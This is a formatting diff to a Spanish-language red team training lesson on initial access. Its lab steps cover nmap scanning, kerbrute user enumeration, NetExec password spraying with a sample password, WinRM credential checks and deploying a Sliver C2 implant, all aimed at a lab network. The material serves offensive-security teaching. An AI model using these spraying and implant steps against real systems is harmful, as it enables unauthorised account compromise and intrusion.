@@ -54,13 +54,17 @@ Al finalizar, el alumno podrá:
 1. **Mapea la superficie.** `nmap -sV -p- 10.10.10.0/24` en tu lab para localizar servicios expuestos (web, RDP, SMB, VPN).
 2. **Explota un servicio público.** Toma la web vulnerable del lab y consigue ejecución (reutiliza técnicas de la Parte 4/5); confirma un shell.
 3. **Enumera usuarios para spraying.** Contra el DC de laboratorio:
+
    ```bash
    kerbrute userenum -d lab.local --dc 10.10.10.10 users.txt
    ```
+
 4. **Password spraying controlado.** Una sola contraseña por ronda para evitar lockout:
+
    ```bash
    nxc smb 10.10.10.10 -u users.txt -p 'Oto2026!' --continue-on-success
    ```
+
 5. **Valida credenciales.** Con un par válido, comprueba acceso SMB/WinRM: `nxc winrm 10.10.10.20 -u user -p 'Oto2026!'`.
 6. **Establece el foothold.** Entrega un implante C2 (Sliver) a la máquina comprometida y confirma la sesión a través del redirector.
 7. **Documenta el vector** elegido, su ID ATT&CK y su nivel de sigilo relativo.
@@ -102,9 +106,9 @@ Porque un login legítimo genera poca telemetría anómala frente a un exploit r
 
 ## 🔗 Referencias
 
-- MITRE ATT&CK — *Initial Access* (TA0001). https://attack.mitre.org/tactics/TA0001/
-- NetExec (nxc). https://github.com/Pennyw0rth/NetExec
-- kerbrute. https://github.com/ropnop/kerbrute
+- MITRE ATT&CK — *Initial Access* (TA0001). <https://attack.mitre.org/tactics/TA0001/>
+- NetExec (nxc). <https://github.com/Pennyw0rth/NetExec>
+- kerbrute. <https://github.com/ropnop/kerbrute>
 - Clark, B. — *RTFM: Red Team Field Manual v2*.
 
 ## ➡️ Siguiente clase
